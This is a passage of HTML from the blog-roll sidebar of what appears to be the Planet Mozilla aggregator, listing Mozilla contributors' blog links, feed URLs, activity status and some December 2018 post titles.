href="https://lawrencemandel.com/" class="message" title="no activity in 90 days">Lawrence Mandel</a></li><li><a title="subscribe" href="http://blog.lmorchard.com/tag/mozilla/feed"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.lmorchard.com/" class="message" title="no activity in 90 days">Les Orchard</a></li><li><a title="subscribe" href="http://www.bookmaniac.org/category/planetmozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://www.bookmaniac.org/wordpress" class="message" title="no activity in 90 days">Liz Henry</a></li><li><a title="subscribe" href="https://www.hirlimann.net/Ludovic/carnet/?feed/category/Mozilla/atom"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://www.hirlimann.net/Ludovic/carnet/" title="Carnet de Ludovic - Mozilla" class="active">Ludovic Hirlimann</a><ul><li><a href="https://www.hirlimann.net/Ludovic/carnet/?post/2018/12/21/December-2018-what-extensions-do-I-use-in-Firefox-dsktop">December 2018 - what extensions do I use in Firefox desktop</a></li></ul></li><li><a title="subscribe" href="https://lu.is/blog/category/pmo/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://lu.is/" class="message" title="no activity in 90 days">Luis Villa</a></li><li><a title="subscribe" href="https://blog.mozilla.org/luke/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.mozilla.org/luke" class="message" title="no activity in 90 days">Luke Wagner</a></li><li><a title="subscribe" href="http://madhava.com/egotism/planet.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://madhava.com/egotism/" class="message" title="no activity in 90 days">Madhava Enros</a></li><li><a title="subscribe" href="https://mozillamediagoddess.org/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://mozillamediagoddess.org/" class="message" title="no activity in 90 days">Maire Reavy</a></li><li><a title="subscribe" href="http://www.erranderr.com/blog/feeds/mozilla.atom.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://www.erranderr.com/blog/" class="message" title="no activity in 90 days">Maja Frydrychowicz</a></li><li><a title="subscribe" href="http://manishearth.github.io/blog/categories/mozilla/atom.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://manishearth.github.io/" class="message" title="no activity in 90 days">Manish Goregaokar</a></li><li><a title="subscribe" href="http://mozillamarciaknous.wix.com/mozcommunity/feed.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://mozillamarciaknous.wixsite.com/mozcommunity/blog" class="message" title="no activity in 90 days">Marcia Knous</a></li><li><a title="subscribe" href="http://mak77.github.io/feed.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://mak77.github.io/" class="message" title="no activity in 90 days">Marco Bonardo</a></li><li><a title="subscribe" href="https://marco-c.github.io/feed.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://marco-c.github.io/" title="Marco Castelluccio‚Äôs Blog">Marco Castelluccio</a></li><li><a title="subscribe" href="http://www.marcozehe.de/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://www.marcozehe.de/" class="message" title="no activity in 90 days">Marco Zehe</a></li><li><a title="subscribe" href="https://www.thebanners.uk/standard8/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://www.thebanners.uk/standard8" title="Mozilla ‚Äì Standard8's Blog">Mark Banner</a></li><li><a title="subscribe" href="https://mrcote.info/categories/mozilla/index.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://mrcote.info/categories/mozilla/" title="Mozilla on mr mr cote" class="active">Mark C√¥t√©</a><ul><li><a href="https://mrcote.info/blog/2018/11/30/a-tale-of-two-commits/">A Tale of Two Commits</a></li></ul></li><li><a title="subscribe" href="https://medium.com/feed/@mmayo"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://medium.com/@mmayo?source=rss-5c6a321cb3bd------2" class="message" title="no activity in 90 days">Mark Mayo</a></li><li><a title="subscribe" href="http://mreid-moz.github.io/atom.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://mreid-moz.github.io/" class="message" title="no activity in 90 days">Mark Reid</a></li><li><a title="subscribe" href="http://marksurman.commons.ca/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://marksurman.commons.ca/" class="message" title="no activity in 90 days">Mark Surman</a></li><li><a title="subscribe" href="https://markusstange.wordpress.com/tag/planet/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://markusstange.wordpress.com/" class="message" title="no activity in 90 days">Markus Stange</a></li><li><a title="subscribe" href="https://humanoids.be/log/category/software/freeware/opensource/mozilla/feed/?lang=en_us"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://humanoids.be/log" class="message" title="no activity in 90 days">Martin Giger</a></li><li><a title="subscribe"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a class="message" title="404: not found">Matej Novak</a></li><li><a title="subscribe" href="http://horv.at/blog/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://horv.at/blog" class="message" title="no activity in 90 days">Matja≈æ Horvat</a></li><li><a title="subscribe" href="https://limpet.net/mbrubeck/atom.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://limpet.net/mbrubeck/" class="message" title="no activity in 90 days">Matt Brubeck</a></li><li><a title="subscribe"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a class="message" title="404: not found">Matthew Claypotch</a></li><li><a title="subscribe" href="http://blog.mjg.im/tag/mozilla/atom.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://blog.mjg.im/" class="message" title="no activity in 90 days">Matthew Gregan</a></li><li><a title="subscribe" href="http://matthew.noorenberghe.com/tags/mozilla/feed"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://matthew.noorenberghe.com/tags/mozilla" class="message" title="no activity in 90 days">Matthew Noorenberghe</a></li><li><a title="subscribe" href="http://avatraxiom.livejournal.com/data/atom/?tag=bugzilla"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://avatraxiom.livejournal.com/" class="message" title="no activity in 90 days">Max Kanat-Alexander</a></li><li><a title="subscribe" href="http://mcomella.xyz/feed.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://mcomella.xyz/" class="message" title="no activity in 90 days">Michael Comella</a></li><li><a title="subscribe" href="http://droettboom.com/feeds/mozilla.atom.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://droettboom.com/" class="message" title="no activity in 90 days">Michael Droettboom</a></li><li><a title="subscribe" href="https://mike.kaply.com/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://mike.kaply.com/" class="message" title="no activity in 90 days">Michael Kaply</a></li><li><a title="subscribe" href="http://www.mkelly.me/feeds/mozilla.atom"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://www.mkelly.me/" class="message" title="no activity in 90 days">Michael Kelly</a></li><li><a title="subscribe"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a class="message" title="404: not found">Michael Kohler</a></li><li><a title="subscribe" href="https://mozilla.michaelverdi.com/feed"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://mozilla.michaelverdi.com/" class="message" title="no activity in 90 days">Michael Verdi</a></li><li><a title="subscribe" href="http://michellethorne.cc/tag/webmaker/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://michellethorne.cc/" class="message" title="no activity in 90 days">Michelle Thorne</a></li><li><a title="subscribe" href="http://mikeconley.ca/blog/category/mozilla-2/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://mikeconley.ca/blog" class="message" title="no activity in 90 days">Mike Conley</a></li><li><a title="subscribe" href="https://glandium.org/blog/?feed=rss2&amp;cat=25&amp;tag=en"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://glandium.org/blog" title="p.m.o ‚Äì glandium.org">Mike Hommey</a></li><li><a title="subscribe" href="http://exple.tive.org/blarg/category/work/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://exple.tive.org/blarg" title="work ‚Äì blarg?">Mike Hoye</a></li><li><a title="subscribe"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a class="message" title="404: not found">Mike Ratcliffe</a></li><li><a title="subscribe" href="http://gittup.org/blog/index.rss"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://gittup.org/blog/" class="message" title="no activity in 90 days">Mike Shal</a></li><li><a title="subscribe" href="https://miketaylr.com/posts/rss.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://miketaylr.com/posts" title="Mike Taylr Dot Com Web Log">Mike Taylor</a></li><li><a title="subscribe" href="http://blog.lizardwrangler.com/feed/atom/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.lizardwrangler.com/" class="message" title="no activity in 90 days">Mitchell Baker</a></li><li><a title="subscribe" href="https://blog.mozilla.org/addons/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.mozilla.org/addons" title="Mozilla Add-ons Blog" class="active">Mozilla Addons Blog</a><ul><li><a href="https://blog.mozilla.org/addons/2018/12/20/extensions-in-firefox-65/">Extensions in Firefox 65</a></li><li><a href="https://blog.mozilla.org/addons/2018/11/30/decembers-featured-extensions-2/">December‚Äôs Featured Extensions</a></li></ul></li><li><a title="subscribe" href="https://mozilla-bteam.tumblr.com/rss"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://mozilla-bteam.tumblr.com/" title="Mozilla B-Team" class="active">Mozilla B-Team</a><ul><li><a href="https://mozilla-bteam.tumblr.com/post/180639137698">happy bmo push day!</a></li><li><a href="https://mozilla-bteam.tumblr.com/post/180622734648">happy bmo push days</a></li><li><a href="https://mozilla-bteam.tumblr.com/post/180620441743">happy bmo push day!</a></li></ul></li><li><a title="subscribe" href="https://blog.mozilla.org/services/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.mozilla.org/services" title="Mozilla Services">Mozilla Cloud Services Blog</a></li><li><a title="subscribe"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a class="message" title="internal server error">Mozilla Community Ops Team</a></li><li><a title="subscribe" href="http://fundraising.mozilla.org/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://fundraising.mozilla.org/" class="message" title="no activity in 90 days">Mozilla Fundraising</a></li><li><a title="subscribe" href="https://blog.mozilla.org/futurereleases/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.mozilla.org/futurereleases" title="Future Releases" class="active">Mozilla Future Releases Blog</a><ul><li><a href="https://blog.mozilla.org/futurereleases/2018/12/06/firefox-coming-to-the-windows-10-on-qualcomm-snapdragon-devices-ecosystem/">Firefox Coming to the Windows 10 on Qualcomm Snapdragon Devices Ecosystem</a></li></ul></li><li><a title="subscribe" href="https://mozillagfx.wordpress.com/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://mozillagfx.wordpress.com/" title="Mozilla Gfx Team Blog" class="active">Mozilla GFX</a><ul><li><a href="https://mozillagfx.wordpress.com/2018/12/13/webrender-newsletter-33/">WebRender newsletter #33</a></li><li><a href="https://mozillagfx.wordpress.com/2018/11/29/webrender-newsletter-32/">WebRender newsletter #32</a></li></ul></li><li><a title="subscribe" href="https://blog.mozilla.org/l10n/category/planet/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.mozilla.org/l10n" title="Planet ‚Äì Mozilla L10N">Mozilla Localization (L10N)</a></li><li><a title="subscribe" href="https://mozilla.github.io/meao/atom.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://mozilla.github.io/meao/" class="message" title="no activity in 90 days">Mozilla Marketing Engineering &amp; Ops Blog</a></li><li><a title="subscribe" href="https://blog.mozilla.org/opendesign/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.mozilla.org/opendesign" class="message" title="no activity in 90 days">Mozilla Open Design Blog</a></li><li><a title="subscribe" href="https://medium.com/feed/mozilla-open-innovation"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://medium.com/mozilla-open-innovation?source=rss----410b8dc3986d---4" title="Mozilla Open Innovation - Medium" class="active">Mozilla Open Innovation Team</a><ul><li><a href="https://medium.com/mozilla-open-innovation/prototyping-with-intention-33d15fb147c2?source=rss----410b8dc3986d---4">Prototyping with Intention</a></li></ul></li><li><a title="subscribe" href="https://blog.mozilla.org/netpolicy/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.mozilla.org/netpolicy" class="active message" title="duplicate subscription: https://blog.mozilla.org/privacy/feed/">Mozilla Open Policy &amp; Advocacy Blog</a><ul><li><a href="https://blog.mozilla.org/netpolicy/2018/12/21/privacy-in-practice-mozilla-talks-lean-data-in-india/">Privacy in practice: Mozilla talks ‚Äúlean data‚Äù in India</a></li></ul></li><li><a title="subscribe" href="https://blog.mozilla.org/privacy/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.mozilla.org/netpolicy" class="active message" title="duplicate subscription: https://blog.mozilla.org/netpolicy/feed/">Mozilla Privacy Blog</a><ul><li><a href="https://blog.mozilla.org/netpolicy/2018/12/21/privacy-in-practice-mozilla-talks-lean-data-in-india/">Privacy in practice: Mozilla talks ‚Äúlean data‚Äù in India</a></li></ul></li><li><a title="subscribe" href="https://release.mozilla.org/feed.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://release.mozilla.org/" title="Release Management Blog">Mozilla Release Management Team</a></li><li><a title="subscribe" href="https://blog.mozilla.org/mozillareps/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.mozilla.org/mozillareps" title="Mozilla Reps">Mozilla Reps Community</a></li><li><a title="subscribe" href="http://www.mozillascience.org/feed"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a class="message" title="no activity in 90 days">Mozilla Science Lab</a></li><li><a title="subscribe" href="https://blog.mozilla.org/security/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.mozilla.org/security" title="Mozilla Security Blog">Mozilla Security Blog</a></li><li><a title="subscribe" href="https://blog.mozilla.org/thunderbird/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.mozilla.org/thunderbird" title="The Mozilla Thunderbird Blog">Mozilla Thunderbird</a></li><li><a title="subscribe" href="https://blog.mozvr.com/rss/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.mozvr.com/" title="Mozilla Mixed Reality Blog" class="active">Mozilla VR Blog</a><ul><li><a href="https://blog.mozvr.com/a-new-browser-for-magic-leap/">A new browser for Magic Leap</a></li><li><a href="https://blog.mozvr.com/firefox-reality-update-supports-360-videos-and-7-additional-languages/">Firefox Reality update supports 360 videos and 7 additional languages</a></li></ul></li><li><a title="subscribe" href="https://blog.mozilla.org/webdev/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.mozilla.org/webdev" class="message" title="no activity in 90 days">Mozilla WebDev Community</a></li><li><a title="subscribe" href="https://mykzilla.org/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://mykzilla.org/" class="message" title="no activity in 90 days">Myk Melez</a></li><li><a title="subscribe" href="https://blog.mozilla.org/nfroyd/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.mozilla.org/nfroyd" class="message" title="no activity in 90 days">Nathan Froyd</a></li><li><a title="subscribe" href="http://enndeakin.wordpress.com/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://enndeakin.wordpress.com/" class="message" title="no activity in 90 days">Neil Deakin</a></li><li><a title="subscribe" href="https://blog.mozilla.org/nnethercote/feed/atom/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.mozilla.org/nnethercote" title="Nicholas Nethercote">Nicholas Nethercote</a></li><li><a title="subscribe" href="http://www.ncalexander.net/blog/feeds/mozilla.atom.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://www.ncalexander.net/blog/" class="message" title="no activity in 90 days">Nick Alexander</a></li><li><a title="subscribe" href="http://www.ncameron.org/blog/rss/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://www.ncameron.org/blog/" title="featherweight musings" class="active">Nick Cameron</a><ul><li><a href="http://www.ncameron.org/blog/what-to-do-in-christchurch/">What to do in Christchurch</a></li><li><a href="http://www.ncameron.org/blog/rust-in-2022/">Rust in 2022</a></li><li><a href="http://www.ncameron.org/blog/more-on-rls-version-numbering/">More on RLS version numbering</a></li></ul></li><li><a title="subscribe" href="http://nickdesaulniers.github.io/atom.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://nickdesaulniers.github.io/" title="Nick Desaulniers">Nick Desaulniers</a></li><li><a title="subscribe" href="http://fitzgeraldnick.com/feed.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://fitzgeraldnick.com/" title="Nick Fitzgerald" class="active">Nick Fitzgerald</a><ul><li><a href="http://fitzgeraldnick.com/2018/12/14/rust-and-webassembly-in-2019.html">Rust and WebAssembly in 2019</a></li><li><a href="http://fitzgeraldnick.com/2018/12/13/rust-raps.html">Rust Raps</a></li><li><a href="http://fitzgeraldnick.com/2018/12/11/rust-2019-think-bigger.html">Rust 2019: Think Bigger</a></li><li><a href="http://fitzgeraldnick.com/2018/12/02/wasm-bindgen-how-does-it-work.html">wasm-bindgen ‚Äî how does it work?!</a></li></ul></li><li><a title="subscribe"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a class="message" title="404: not found">Nick Hurley</a></li><li><a title="subscribe" href="http://osunick.com/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://osunick.com/" class="message" title="no activity in 90 days">Nick Nguyen</a></li><li><a title="subscribe" href="https://ftangftang.wordpress.com/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://ftangftang.wordpress.com/" class="message" title="no activity in 90 days">Nick Thomas</a></li><li><a title="subscribe" href="http://smallcultfollowing.com/babysteps/atom.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://smallcultfollowing.com/babysteps/" title="Baby Steps">Niko Matsakis</a></li><li><a title="subscribe" href="https://oeekker.wordpress.com/category/planet/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://oeekker.wordpress.com/" class="message" title="no activity in 90 days">Onno Ekker</a></li><li><a title="subscribe" href="http://feeds.feedburner.com/PastMidnight"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://blog.astithas.com/" class="message" title="no activity in 90 days">Panos Astithas</a></li><li><a title="subscribe" href="http://www.chevrel.org/carnet/?feed/tag/InEnglish/atom"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://www.chevrel.org/carnet/?" class="message" title="no activity in 90 days">Pascal Chevrel</a></li><li><a title="subscribe" href="http://patrick.cloke.us/feeds/rss.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://patrick.cloke.us/" title="Like bricks in the sky">Patrick Cloke</a></li><li><a title="subscribe" href="https://patrickfinch.com/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://patrickfinch.com/" class="message" title="no activity in 90 days">Patrick Finch</a></li><li><a title="subscribe" href="http://bitsup.blogspot.com/feeds/posts/default/-/firefox"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://bitsup.blogspot.com/search/label/firefox" class="message" title="no activity in 90 days">Patrick McManus</a></li><li><a title="subscribe"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a class="message" title="404: not found">Patrick Walton</a></li><li><a title="subscribe" href="https://paul.bone.id.au/blog-planet-mozilla.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://paul.bone.id.au/" class="message" title="no activity in 90 days">Paul Bone</a></li><li><a title="subscribe" href="https://pmac.io/tags/mozilla/index.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://pmac.io/tags/mozilla/" class="message" title="no activity in 90 days">Paul McLanahan</a></li><li><a title="subscribe" href="http://paulrouget.com/index.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://paulrouget.com/" class="message" title="no activity in 90 days">Paul Rouget</a></li><li><a title="subscribe" href="http://petemoore.tumblr.com/rss"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://petemoore.tumblr.com/" class="message" title="no activity in 90 days">Pete Moore</a></li><li><a title="subscribe"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a class="message" title="404: not found">Planet Mozilla Interns</a></li><li><a title="subscribe" href="http://pomax.github.io/gh-weblog-2/rss.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://pomax.github.io/" class="message" title="no activity in 90 days">Pomax</a></li><li><a title="subscribe" href="https://medium.com/feed/@vershwal"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://medium.com/@vershwal?source=rss-a18d6bdbacf3------2" class="message" title="no activity in 90 days">Princi Vershwal</a></li><li><a title="subscribe" href="https://medium.com/feed/project-tofino"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://medium.com/project-tofino?source=rss----b6989d965a26---4" class="message" title="no activity in 90 days">Project Tofino</a></li><li><a title="subscribe" href="https://quality.mozilla.org/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://quality.mozilla.org/" title="Mozilla Quality Assurance" class="active">QMO</a><ul><li><a href="https://quality.mozilla.org/2018/12/firefox-65-beta-6-testday-results/">Firefox 65 Beta 6 Testday Results</a></li><li><a href="https://quality.mozilla.org/2018/12/firefox-65-beta-6-testday-december-21th/">Firefox 65 Beta 6 Testday, December 21th</a></li></ul></li><li><a title="subscribe" href="http://blog.rabimba.com/feeds/posts/default/-/mozilla?alt=rss"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.rabimba.com/search/label/mozilla" title="RK's Rambling">Rabimba</a></li><li><a title="subscribe" href="http://www.rebron.org/category/mozilla/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://www.rebron.org/feed/" class="message" title="no activity in 90 days">Rafael Ebron</a></li><li><a title="subscribe" href="http://rail.merail.ca/categories/mozilla.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://rail.merail.ca/" class="message" title="no activity in 90 days">Rail Aliiev</a></li><li><a title="subscribe" href="http://160.twinql.com/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://160.twinql.com/" class="message" title="no activity in 90 days">Richard Newman</a></li><li><a title="subscribe" href="http://rhelmer.org/blog/feeds/tag/mozilla.atom.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://rhelmer.org/blog/" class="message" title="no activity in 90 days">Robert Helmer</a></li><li><a title="subscribe" href="https://home.kairo.at/?d=w&amp;i=1&amp;m=v&amp;c=atom&amp;f.lang=en"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://home.kairo.at/?d=w&amp;i=1&amp;m=v&amp;f.lang=en" class="message" title="no activity in 90 days">Robert Kaiser</a></li><li><a title="subscribe" href="http://www.blogger.com/feeds/71141318914133781/posts/default/-/Mozilla"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://robert.ocallahan.org/search/label/Mozilla" title="Eyes Above The Waves">Robert O'Callahan</a></li><li><a title="subscribe" href="https://robertovitillo.com/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://robertovitillo.com/" class="message" title="no activity in 90 days">Roberto A. Vitillo</a></li><li><a title="subscribe" href="http://blog.rodms.com/tag/planet/feed.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://blog.rodms.com/" class="message" title="no activity in 90 days">Rodrigo Silveira</a></li><li><a title="subscribe"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a class="message" title="404: not found">Rok Garbas</a></li><li><a title="subscribe" href="http://ombrosa.co/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://ombrosa.co/" class="message" title="no activity in 90 days">Rosana Ardila</a></li><li><a title="subscribe" href="https://www.nukeador.com/tag/mozilla-en/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://www.nukeador.com/" class="message" title="no activity in 90 days">Rub√©n Mart√≠n</a></li><li><a title="subscribe" href="http://blog.harterrt.com/feeds/mozilla.rss.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.harterrt.com/" title="blog.harterrt.com" class="active">Ryan Harter</a><ul><li><a href="https://blog.harterrt.com/2018_slow_to_respond.html">Slow to respond through 2018</a></li></ul></li><li><a title="subscribe" href="https://www.rfk.id.au/blog/feeds/mozilla.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://www.rfk.id.au/" class="message" title="no activity in 90 days">Ryan Kelly</a></li><li><a title="subscribe" href="http://www.sam-i-am.com/blog/tag/mozilla/atom.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://www.sam-i-am.com/blog/" class="message" title="no activity in 90 days">Sam Foster</a></li><li><a title="subscribe" href="https://campaignmusings.wordpress.com/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://campaignmusings.wordpress.com/" class="message" title="no activity in 90 days">Sara Haghdoosti</a></li><li><a title="subscribe" href="http://blog.seanmartell.com/ramblings/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://blog.seanmartell.com/" class="message" title="no activity in 90 days">Sean Martell</a></li><li><a title="subscribe"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a class="message" title="http status 503">Sebastin Santy</a></li><li><a title="subscribe" href="http://www.chesnok.com/daily/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://www.chesnok.com/daily" class="message" title="no activity in 90 days">Selena Deckelmann</a></li><li><a title="subscribe" href="https://shanetomlinson.com/tag/mozilla/rss/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://shanetomlinson.com/" class="message" title="no activity in 90 days">Shane Tomlinson</a></li><li><a title="subscribe"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a class="message" title="410: gone">Shihan Viswaprasath</a></li><li><a title="subscribe" href="http://shinglyu.github.io/feed-mozilla.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://shinglyu.github.io/" title="Shing Lyu - Articles" class="active">Shing Lyu</a><ul><li><a href="https://shinglyu.github.io/web/2018/12/25/counting-your-contribution-to-a-git-repository.html">Counting your contribution to a git repository</a></li></ul></li><li><a title="subscribe" href="https://sjasoria.github.io/feed.mozilla.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://sjasoria.github.io/" class="message" title="no activity in 90 days">Shruti Jasoria</a></li><li><a title="subscribe"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a class="message" title="internal server error">Soledad Penades</a></li><li><a title="subscribe"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a class="message" title="404: not found">Stephen Horlander</a></li><li><a title="subscribe" href="https://blog.mozilla.org/sfink/tag/planet/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.mozilla.org/sfink" class="message" title="no activity in 90 days">Steve Fink</a></li><li><a title="subscribe" href="https://muffinresearch.co.uk/tag/mozilla/rss/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://muffinresearch.co.uk/" class="message" title="no activity in 90 days">Stuart Colville</a></li><li><a title="subscribe" href="https://blog.mozilla.org/sumo/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.mozilla.org/sumo" class="message" title="no activity in 90 days">Support.Mozilla.Org</a></li><li><a title="subscribe" href="http://sylvestre.ledru.info/blog/cat15/mozilla/?tempskin=_rss2"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://sylvestre.ledru.info/blog/" class="message" title="no activity in 90 days">Sylvestre Ledru</a></li><li><a title="subscribe" href="http://tantek.com/updates.atom?ot=article"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://tantek.com/" class="message" title="no activity in 90 days">Tantek √áelik</a></li><li><a title="subscribe" href="https://blog.mozilla.org/tanvi/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.mozilla.org/tanvi" class="message" title="no activity in 90 days">Tanvi Vyas</a></li><li><a title="subscribe" href="http://blog.ziade.org/tag/mozilla/feed"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://ziade.org/" class="message" title="no activity in 90 days">Tarek Ziad√©</a></li><li><a title="subscribe" href="https://blog.mozilla.org/ted/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.mozilla.org/ted" class="message" title="no activity in 90 days">Ted Mielczarek</a></li><li><a title="subscribe" href="https://blog.mozilla.org/firefox/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.mozilla.org/firefox" title="The Firefox Frontier" class="active">The Firefox Frontier</a><ul><li><a href="https://blog.mozilla.org/firefox/firefox-reality-oculus-go-vr/">How to Use Firefox Reality on the Oculus Go VR Headset</a></li><li><a href="https://blog.mozilla.org/firefox/firefox-fights-for-you/">Firefox fights for you</a></li></ul></li><li><a title="subscribe" href="https://blog.mozilla.org/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a 